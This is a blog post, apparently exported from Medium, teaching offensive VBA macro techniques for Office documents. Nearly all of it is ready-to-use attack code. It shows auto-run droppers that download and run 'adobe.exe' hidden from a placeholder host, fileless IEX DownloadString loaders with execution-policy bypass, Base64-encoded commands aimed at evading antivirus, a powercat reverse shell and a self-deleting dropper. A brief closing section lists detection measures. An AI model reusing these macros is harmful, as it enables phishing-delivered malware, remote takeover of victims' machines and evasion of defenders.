---
layout: post
title: "Offensive VBA Techniques Part 2: Stealth Droppers, Encoded Payloads and Powercat"
date: 2025-08-26
categories: [Red Team,Macro,Malware Analysis,Malware Development,Blue Team,VBA,Cyber Security]
image: https://cdn-images-1.medium.com/max/800/1*mnrR2hoKfGXc2KOuxiCi8A.jpeg
---

After discussing fundamental VBS in Part 1, we will now move on to more complex subjects, such as

> . Powershell Droppers

> . Encoded Droppers

> . Powercat Reverse Shell

> . Auto-Remove Dropper

* * *

### Detailed Breakdown of PowerShell Droppers in VBA

This VBA macro script acts as a **PowerShell dropper**, designed to download and execute remote payloads via PowerShell. It employs different techniques for **disk-based** and **fileless execution**, allowing flexibility in delivering malicious code.

#### 1. Understanding `AutoOpen() &Document_Open()`

```
Sub AutoOpen()
    Call PSDropper
End Sub
Sub Document_Open()
End Sub
```

**Explanation**

- `AutoOpen()`This macro automatically executes when the document is opened (used in Word/Excel).
- `Document_Open()`: A stub that can be modified to trigger macros upon document opening.

**Purpose**: Ensures **automatic execution** when the document is opened (TTP for VBA-based malware).

* * *

#### 2. `PSDropper()` - Disk-Based PowerShell Dropper

```
Sub PSDropper()
    Dim dropper As Object
    Set dropper = CreateObject("WScript.Shell")
    dropper.Run "powershell.exe -Command ""Invoke-WebRequest -Uri 'http://<ip>:8080/adobe.exe' -OutFile 'C:\Users\Public\adobe.exe'; Start-Process 'C:\Users\Public\adobe.exe'""", 0 ,False
End Sub
```

**Step-by-Step Execution**

1. **Creates an instance of** `WScript.Shell` for executing system commands.
2. **Runs PowerShell** with `Invoke-WebRequest` to **download a payload (**`adobe.exe`**)** from `http://<ip>:8080/`[.](http://192.168.2.24:8080/.)
3. **Saves the payload** to `C:\Users\Public\adobe.exe`(common folder for persistence).
4. **Executes the downloaded file** using `Start-Process`.
5. **Runs in hidden mode** (`0` parameter ensures no visible console window).

**Use Case**: This method **writes a payload to disk** before execution.

* * *

#### 3. `FileLessDropper()` - Fileless PowerShell Execution

```
Sub FileLessDropper()
    Dim psdropper As Object
    Set psdropper = CreateObject("WScript.Shell")
    psdropper.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""IEX(New-Object Net.WebClient).DownloadString('http://<ip>:8080/shell.ps1')""" ,0,False
End Sub
```

**Step-by-Step Execution**

1. **Creates a** `WScript.Shell` **object** to execute PowerShell.
2. **Runs PowerShell in bypass mode** (`-ExecutionPolicy Bypass` avoids script execution restrictions).
3. **Uses** `IEX (Invoke-Expression)` **to execute a remote script** directly in memory.
4. **Fetches and executes** `shell.ps1` **from** `http://<ip>:8080/`[.](http://192.168.2.24:8080/.)
5. **No files are written to disk** (entire execution remains in memory).

**Use Case**:

- Completely **fileless execution**.
- Harder to detect by **signature-based AVs**.
- **Common in modern malware and penetration testing frameworks** (e.g., Metasploit, Empire, Cobalt Strike).

* * *

#### 4. `DynamicDropper()` - Flexible Payload Storage Location

```
Sub DynamicDropper()
    Dim dropper As Object
    Set dropper = CreateObject("WScript.Shell")
    downloadPath = Environ("TEMP") & "\adobe.exe"
    dropper.Run "powershell.exe -Command ""Invoke-WebRequest -Uri 'http://<ip>:8080/adobe.exe' -OutFile '" & downloadPath & "' ; Start-Process '" & downloadPath & "'""" ,0,False
End Sub
```

**Step-by-Step Execution**

1. **Uses** `Environ("TEMP")` **to dynamically locate the user's temp folder**.
2. **Downloads** `adobe.exe` from the attacker's machine.
3. **Saves it in the Windows TEMP directory**.
4. **Executes the payload**.

**Why use the TEMP folder?**

- **Bypasses some AV heuristics**.
- **More flexible** for execution across different user environments.
- Often used in **phishing payloads and post-exploitation frameworks**.

* * *

### Encoded Dropper

#### Understanding PowerShell Base64 Encoding for Obfuscation

This script **encodes a PowerShell command in Base64** and then attempts to execute it using VBA. **Base64 encoding is commonly used to obfuscate malicious scripts**, making them harder to detect by signature-based security tools.

* * *

#### 1. Understanding the Encoding Process

The following **PowerShell command** is designed to:

1. **Download and execute a remote PowerShell script** (`shell.ps1`).
2. **Encode the command in Base64** to avoid detection.
3. **Execute the encoded command using PowerShell’s** `-EncodedCommand` **flag.**

**Encoding the PowerShell Command**

```
$command="IEX (New-Object Net.WebClient).DownloadString('http://<ip>:8080/shell.ps1')"
$bytes=[System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand=[Convert]::ToBase64String($bytes)
Write-Output $encodedCommand
```

**Step-by-Step Breakdown**

1. **Define the command**:

```
$command="IEX (New-Object Net.WebClient).DownloadString('http://<ip>:8080/shell.ps1')"
```

- Uses `IEX (Invoke-Expression)` to execute the **downloaded PowerShell script in memory**.
- The script `shell.ps1` is hosted on `<ip>:8080`.

**2. Convert the command to bytes in Unicode format**:

```
$bytes=[System.Text.Encoding]::Unicode.GetBytes($command)
```

- PowerShell’s `-EncodedCommand` parameter **expects Unicode encoding**, so we encode the string as Unicode.

**3. Encode the bytes in Base64**:

```
$encodedCommand=[Convert]::ToBase64String($bytes)
```

- This obfuscates the original command, **bypassing basic string-based detections**.

**4. Output the encoded command**:

```
Write-Output $encodedCommand
```

- Example **Base64-encoded output**:

```
SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAA...
```

* * *

#### 2. VBA Macro for Executing Encoded PowerShell Command

```
Sub EncodedDropper()
    Dim dropper As Object
    Dim encodedCommand As String
    Set dropper = CreateObject("WScript.Shell")
    encodedCommand = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAA..."
    dropper.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand " & encodedCommand, 0, False
End Sub
```

**Step-by-Step Breakdown**

1. **Creates a** `WScript.Shell` **object** to execute system commands.
2. **Stores the Base64-encoded command in the** `encodedCommand` **variable**.
3. **Runs PowerShell in hidden mode (**`0` **parameter)**, bypassing execution policies.
4. **Executes the Base64-encoded command** using `-EncodedCommand`.

**Advantages of This Technique**

- **Bypasses command-line security tools** that scan for suspicious PowerShell commands.
- **Avoids string-based detections** for `IEX`, `DownloadString`, or `Invoke-WebRequest`.
- **Executes a fileless payload in memory**, making detection harder.

* * *

### Powercat Reverse Shell

The **PowerCat** function executes a **PowerShell reverse shell** using `powercat.ps1`.

**Breakdown of the** `powercat` **Subroutine**

```
Sub powercat()
	Dim url As String
	Dim psscript As String
        url = "http://<ip>:<port>/powercat.ps1"
        psscript = "IEX (New-Object System.Net.WebClient).DownloadString('" & url & "'); powercat -c <ip> -p <port> -e cmd"
        Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -c """ & psscript & """", vbHide
End Sub
```

**What This Does**

1. **Defines** `url` pointing to `powercat.ps1`, which is hosted on `<ip>:<port>`.
2. **Constructs the PowerShell script (**`psscript`**)**:

<!--THE END-->

- Uses `IEX` (Invoke-Expression) to execute a downloaded script in memory.
- Runs **PowerCat** (`powercat -c <ip> -p <port> -e cmd`), which:
- **Connects back** to &lt;ip&gt; on port `<port>`.
- **Spawns** `cmd.exe` for remote command execution.

**3. Executes the PowerShell command**:

Runs it with:

- `-ExecutionPolicy Bypass`: Bypasses PowerShell execution restrictions.
- `-WindowStyle Hidden`: Runs it stealthily.
- `vbHide`: Hides the process from the user.

* * *

### Auto-Remove Dropper

This function:

1. **Downloads** `adobe.exe` to `C:\Users\Admin\AppData\Local\Temp\`
2. **Executes** `adobe.exe` **and waits for it to finish**
3. **Deletes itself after execution**

### Breakdown of `AutoRemoveDropper`

```
Sub AutoRemoveDropper()
	Dim dropper As Object
	Set dropper = CreateObject("WScript.Shell")
        dropper.Run "powershell.exe -Command ""Invoke-WebRequest -Uri 'http://<ip>:8080/adobe.exe' -OutFile 'C:\Users\Admin\AppData\Local\Temp\adobe.exe'; Start-Process 'C:\Users\Admin\AppData\Local\Temp\adobe.exe' -Wait; Remove-Item -Path 'C:\Users\Admin\AppData\Local\Temp\adobe.exe' -Force""", 0, True
End Sub
```

**What This Does**

1. **Downloads** `adobe.exe` via `Invoke-WebRequest` from `<ip>:8080`.
2. **Runs** `adobe.exe` **and waits for it to finish** (`-Wait` ensures it fully executes before removal).
3. **Deletes** `adobe.exe` from the `Temp` directory.

#### Key Features

**Stealthy**: Deletes itself after execution.  
**Persistence Possible**: If scheduled to run at boot.

* * *

#### How to Detect This?

1. **Monitoring PowerShell Execution**

<!--THE END-->

- Enable **Windows Event Logging** (`Event ID 4104` for script blocks).
- Detect `-ExecutionPolicy Bypass` **and** `IEX(New-Object Net.WebClient)`.

**2. Network Monitoring**

- Block outbound connections to **unknown external servers**.
- Detect unusual **PowerShell HTTP requests**.

**3. Behavior-Based Detection**

- Monitor **new file execution from TEMP or Public directories**.
- Flag **non-interactive PowerShell sessions**.

By [Moataz Osama](https://medium.com/@mezo512) on [April 20, 2025](https://medium.com/p/dc254f9d89a2).

[Canonical link](https://medium.com/@mezo512/offensive-vba-techniques-part-2-stealth-droppers-encoded-payloads-powercat-dc254f9d89a2)

Exported from [Medium](https://medium.com) on August 26, 2025.
